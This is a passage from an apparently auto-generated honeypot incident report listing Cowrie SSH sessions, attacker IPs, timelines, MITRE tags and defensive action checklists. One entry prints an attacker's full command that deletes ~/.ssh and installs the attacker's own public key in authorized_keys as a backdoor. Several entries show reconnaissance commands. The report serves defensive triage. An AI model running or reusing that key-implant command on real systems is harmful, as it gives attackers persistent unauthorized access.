- [ ] Submit `117.39.63[.]46` to AbuseIPDB if not already reported
- [ ] Block `117.39.63[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94b71f8a4200

| Field | Detail |
|---|---|
| **Source IP** | `50.188.204[.]213` |
| **First Seen** | 2026-08-15 07:12 |
| **Last Seen** | 2026-08-15 07:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:12:16` | `cowrie.session.connect` |
| `2026-08-15 07:12:17` | `cowrie.client.version` |
| `2026-08-15 07:12:17` | `cowrie.client.kex` |
| `2026-08-15 07:12:18` | `cowrie.login.success` |
| `2026-08-15 07:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.188.204[.]213` to AbuseIPDB if not already reported
- [ ] Block `50.188.204[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def45233416d

| Field | Detail |
|---|---|
| **Source IP** | `218.29.231[.]106` |
| **First Seen** | 2026-08-15 07:13 |
| **Last Seen** | 2026-08-15 07:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:13:55` | `cowrie.session.connect` |
| `2026-08-15 07:13:55` | `cowrie.client.version` |
| `2026-08-15 07:13:55` | `cowrie.client.kex` |
| `2026-08-15 07:13:57` | `cowrie.login.success` |
| `2026-08-15 07:13:58` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.29.231[.]106` to AbuseIPDB if not already reported
- [ ] Block `218.29.231[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f361b1daa79a

| Field | Detail |
|---|---|
| **Source IP** | `60.171.135[.]254` |
| **First Seen** | 2026-08-15 07:14 |
| **Last Seen** | 2026-08-15 07:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:14:03` | `cowrie.session.connect` |
| `2026-08-15 07:14:04` | `cowrie.client.version` |
| `2026-08-15 07:14:04` | `cowrie.client.kex` |
| `2026-08-15 07:14:09` | `cowrie.login.success` |
| `2026-08-15 07:14:09` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.171.135[.]254` to AbuseIPDB if not already reported
- [ ] Block `60.171.135[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46199f7e7f9c

| Field | Detail |
|---|---|
| **Source IP** | `178.216.165[.]187` |
| **First Seen** | 2026-08-15 07:14 |
| **Last Seen** | 2026-08-15 07:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:14:04` | `cowrie.session.connect` |
| `2026-08-15 07:14:04` | `cowrie.client.version` |
| `2026-08-15 07:14:04` | `cowrie.client.kex` |
| `2026-08-15 07:14:05` | `cowrie.login.success` |
| `2026-08-15 07:14:06` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.216.165[.]187` to AbuseIPDB if not already reported
- [ ] Block `178.216.165[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a927d3fa915

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 07:15 |
| **Last Seen** | 2026-08-15 07:16 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:15:41` | `cowrie.session.connect` |
| `2026-08-15 07:15:47` | `cowrie.client.version` |
| `2026-08-15 07:15:47` | `cowrie.client.kex` |
| `2026-08-15 07:16:10` | `cowrie.login.success` |
| `2026-08-15 07:16:22` | `cowrie.session.params` |
| `2026-08-15 07:16:22` | `cowrie.command.input` |
| `2026-08-15 07:16:28` | `cowrie.log.closed` |
| `2026-08-15 07:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-780c3aab3406

| Field | Detail |
|---|---|
| **Source IP** | `20.193.141[.]133` |
| **First Seen** | 2026-08-15 07:15 |
| **Last Seen** | 2026-08-15 07:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:15:58` | `cowrie.session.connect` |
| `2026-08-15 07:15:58` | `cowrie.client.version` |
| `2026-08-15 07:15:59` | `cowrie.client.kex` |
| `2026-08-15 07:15:59` | `cowrie.login.success` |
| `2026-08-15 07:16:00` | `cowrie.session.params` |
| `2026-08-15 07:16:00` | `cowrie.command.input` |
| `2026-08-15 07:16:00` | `cowrie.command.failed` |
| `2026-08-15 07:16:01` | `cowrie.log.closed` |
| `2026-08-15 07:16:02` | `cowrie.session.params` |
| `2026-08-15 07:16:02` | `cowrie.command.input` |
| `2026-08-15 07:16:02` | `cowrie.session.file_download` |
| `2026-08-15 07:16:02` | `cowrie.log.closed` |
| `2026-08-15 07:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.193.141[.]133` to AbuseIPDB if not already reported
- [ ] Block `20.193.141[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7981839cf0ee

| Field | Detail |
|---|---|
| **Source IP** | `118.163.145[.]175` |
| **First Seen** | 2026-08-15 07:16 |
| **Last Seen** | 2026-08-15 07:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:16:00` | `cowrie.session.connect` |
| `2026-08-15 07:16:02` | `cowrie.client.version` |
| `2026-08-15 07:16:02` | `cowrie.client.kex` |
| `2026-08-15 07:16:04` | `cowrie.login.success` |
| `2026-08-15 07:16:04` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.145[.]175` to AbuseIPDB if not already reported
- [ ] Block `118.163.145[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69a6391f42e5

| Field | Detail |
|---|---|
| **Source IP** | `20.193.141[.]133` |
| **First Seen** | 2026-08-15 07:16 |
| **Last Seen** | 2026-08-15 07:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:16:02` | `cowrie.session.connect` |
| `2026-08-15 07:16:02` | `cowrie.client.version` |
| `2026-08-15 07:16:02` | `cowrie.client.kex` |
| `2026-08-15 07:16:03` | `cowrie.login.success` |
| `2026-08-15 07:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.193.141[.]133` to AbuseIPDB if not already reported
- [ ] Block `20.193.141[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60cc5dbd47aa

| Field | Detail |
|---|---|
| **Source IP** | `20.193.141[.]133` |
| **First Seen** | 2026-08-15 07:16 |
| **Last Seen** | 2026-08-15 07:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:16:03` | `cowrie.session.connect` |
| `2026-08-15 07:16:03` | `cowrie.client.version` |
| `2026-08-15 07:16:04` | `cowrie.client.kex` |
| `2026-08-15 07:16:04` | `cowrie.login.success` |
| `2026-08-15 07:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.193.141[.]133` to AbuseIPDB if not already reported
- [ ] Block `20.193.141[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-844bc6d17798

| Field | Detail |
|---|---|
| **Source IP** | `117.252.93[.]114` |
| **First Seen** | 2026-08-15 07:16 |
| **Last Seen** | 2026-08-15 07:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:16:14` | `cowrie.session.connect` |
| `2026-08-15 07:16:14` | `cowrie.client.version` |
| `2026-08-15 07:16:14` | `cowrie.client.kex` |
| `2026-08-15 07:16:16` | `cowrie.login.success` |
| `2026-08-15 07:16:17` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.252.93[.]114` to AbuseIPDB if not already reported
- [ ] Block `117.252.93[.]114` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e817bac12e84

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 07:23 |
| **Last Seen** | 2026-08-15 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:23:41` | `cowrie.session.connect` |
| `2026-08-15 07:23:41` | `cowrie.client.version` |
| `2026-08-15 07:23:42` | `cowrie.client.kex` |
| `2026-08-15 07:23:42` | `cowrie.login.success` |
| `2026-08-15 07:23:43` | `cowrie.session.params` |
| `2026-08-15 07:23:43` | `cowrie.command.input` |
| `2026-08-15 07:23:43` | `cowrie.log.closed` |
| `2026-08-15 07:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-621649b9f6b9

| Field | Detail |
|---|---|
| **Source IP** | `117.158.166[.]73` |
| **First Seen** | 2026-08-15 07:24 |
| **Last Seen** | 2026-08-15 07:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:24:50` | `cowrie.session.connect` |
| `2026-08-15 07:24:51` | `cowrie.client.version` |
| `2026-08-15 07:24:51` | `cowrie.client.kex` |
| `2026-08-15 07:24:53` | `cowrie.login.success` |
| `2026-08-15 07:24:54` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.158.166[.]73` to AbuseIPDB if not already reported
- [ ] Block `117.158.166[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b1e55b39a91

| Field | Detail |
|---|---|
| **Source IP** | `60.220.241[.]50` |
| **First Seen** | 2026-08-15 07:25 |
| **Last Seen** | 2026-08-15 07:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:25:04` | `cowrie.session.connect` |
| `2026-08-15 07:25:05` | `cowrie.client.version` |
| `2026-08-15 07:25:05` | `cowrie.client.kex` |
| `2026-08-15 07:25:07` | `cowrie.login.success` |
| `2026-08-15 07:25:09` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:25:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.220.241[.]50` to AbuseIPDB if not already reported
- [ ] Block `60.220.241[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c0a8e56f193

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-15 07:30 |
| **Last Seen** | 2026-08-15 07:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:30:24` | `cowrie.session.connect` |
| `2026-08-15 07:30:24` | `cowrie.client.version` |
| `2026-08-15 07:30:24` | `cowrie.client.kex` |
| `2026-08-15 07:30:25` | `cowrie.login.success` |
| `2026-08-15 07:30:25` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:30:25` | `cowrie.direct-tcpip.data` |
| `2026-08-15 07:30:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2e6a6ce79b3

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 07:38 |
| **Last Seen** | 2026-08-15 07:39 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:38:24` | `cowrie.session.connect` |
| `2026-08-15 07:38:29` | `cowrie.client.version` |
| `2026-08-15 07:38:29` | `cowrie.client.kex` |
| `2026-08-15 07:38:53` | `cowrie.login.success` |
| `2026-08-15 07:39:03` | `cowrie.session.params` |
| `2026-08-15 07:39:03` | `cowrie.command.input` |
| `2026-08-15 07:39:10` | `cowrie.log.closed` |
| `2026-08-15 07:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13307df31a70

| Field | Detail |
|---|---|
| **Source IP** | `222.75.225[.]206` |
| **First Seen** | 2026-08-15 07:40 |
| **Last Seen** | 2026-08-15 07:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:40:51` | `cowrie.session.connect` |
| `2026-08-15 07:40:53` | `cowrie.client.version` |
| `2026-08-15 07:40:53` | `cowrie.client.kex` |
| `2026-08-15 07:40:56` | `cowrie.login.success` |
| `2026-08-15 07:40:57` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:41:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.75.225[.]206` to AbuseIPDB if not already reported
- [ ] Block `222.75.225[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6829dbc8389

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]59` |
| **First Seen** | 2026-08-15 07:42 |
| **Last Seen** | 2026-08-15 07:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:42:40` | `cowrie.session.connect` |
| `2026-08-15 07:42:40` | `cowrie.client.version` |
| `2026-08-15 07:42:40` | `cowrie.client.kex` |
| `2026-08-15 07:42:42` | `cowrie.login.success` |
| `2026-08-15 07:42:43` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:42:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]59` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a07ad6f1e6c6

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-08-15 07:42 |
| **Last Seen** | 2026-08-15 07:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:42:48` | `cowrie.session.connect` |
| `2026-08-15 07:42:49` | `cowrie.client.version` |
| `2026-08-15 07:42:49` | `cowrie.client.kex` |
| `2026-08-15 07:42:51` | `cowrie.login.success` |
| `2026-08-15 07:42:51` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:42:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbb9b3292d97

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 07:42 |
| **Last Seen** | 2026-08-15 07:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:42:55` | `cowrie.session.connect` |
| `2026-08-15 07:42:55` | `cowrie.client.version` |
| `2026-08-15 07:42:55` | `cowrie.client.kex` |
| `2026-08-15 07:42:55` | `cowrie.login.success` |
| `2026-08-15 07:42:56` | `cowrie.session.params` |
| `2026-08-15 07:42:56` | `cowrie.command.input` |
| `2026-08-15 07:42:56` | `cowrie.log.closed` |
| `2026-08-15 07:42:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bda92cdac04

| Field | Detail |
|---|---|
| **Source IP** | `117.39.63[.]46` |
| **First Seen** | 2026-08-15 07:47 |
| **Last Seen** | 2026-08-15 07:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:47:42` | `cowrie.session.connect` |
| `2026-08-15 07:47:43` | `cowrie.client.version` |
| `2026-08-15 07:47:43` | `cowrie.client.kex` |
| `2026-08-15 07:47:45` | `cowrie.login.success` |
| `2026-08-15 07:47:46` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:47:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.39.63[.]46` to AbuseIPDB if not already reported
- [ ] Block `117.39.63[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-689777f0c173

| Field | Detail |
|---|---|
| **Source IP** | `182.42.113[.]10` |
| **First Seen** | 2026-08-15 07:47 |
| **Last Seen** | 2026-08-15 07:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:47:51` | `cowrie.session.connect` |
| `2026-08-15 07:47:53` | `cowrie.client.version` |
| `2026-08-15 07:47:53` | `cowrie.client.kex` |
| `2026-08-15 07:47:55` | `cowrie.login.success` |
| `2026-08-15 07:47:55` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.42.113[.]10` to AbuseIPDB if not already reported
- [ ] Block `182.42.113[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9bf2e3d9e47

| Field | Detail |
|---|---|
| **Source IP** | `177.159.150[.]111` |
| **First Seen** | 2026-08-15 07:47 |
| **Last Seen** | 2026-08-15 07:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:47:55` | `cowrie.session.connect` |
| `2026-08-15 07:47:57` | `cowrie.client.version` |
| `2026-08-15 07:47:57` | `cowrie.client.kex` |
| `2026-08-15 07:48:00` | `cowrie.login.success` |
| `2026-08-15 07:48:00` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:48:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.159.150[.]111` to AbuseIPDB if not already reported
- [ ] Block `177.159.150[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-028a435bb77c

| Field | Detail |
|---|---|
| **Source IP** | `220.246.46[.]144` |
| **First Seen** | 2026-08-15 07:48 |
| **Last Seen** | 2026-08-15 07:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:48:07` | `cowrie.session.connect` |
| `2026-08-15 07:48:08` | `cowrie.client.version` |
| `2026-08-15 07:48:08` | `cowrie.client.kex` |
| `2026-08-15 07:48:10` | `cowrie.login.success` |
| `2026-08-15 07:48:11` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.46[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.246.46[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fde94a4b8b9

| Field | Detail |
|---|---|
| **Source IP** | `1.92.151[.]36` |
| **First Seen** | 2026-08-15 07:51 |
| **Last Seen** | 2026-08-15 07:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:51:43` | `cowrie.session.connect` |
| `2026-08-15 07:51:43` | `cowrie.client.version` |
| `2026-08-15 07:51:45` | `cowrie.client.kex` |
| `2026-08-15 07:51:46` | `cowrie.login.success` |
| `2026-08-15 07:51:47` | `cowrie.session.params` |
| `2026-08-15 07:51:47` | `cowrie.command.input` |
| `2026-08-15 07:51:47` | `cowrie.log.closed` |
| `2026-08-15 07:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.92.151[.]36` to AbuseIPDB if not already reported
- [ ] Block `1.92.151[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-163861a94f52

| Field | Detail |
|---|---|
| **Source IP** | `165.232.61[.]133` |
| **First Seen** | 2026-08-15 07:52 |
| **Last Seen** | 2026-08-15 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:52:39` | `cowrie.session.connect` |
| `2026-08-15 07:52:40` | `cowrie.client.version` |
| `2026-08-15 07:52:40` | `cowrie.client.kex` |
| `2026-08-15 07:52:41` | `cowrie.login.success` |
| `2026-08-15 07:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.61[.]133` to AbuseIPDB if not already reported
- [ ] Block `165.232.61[.]133` at perimeter firewall / security group
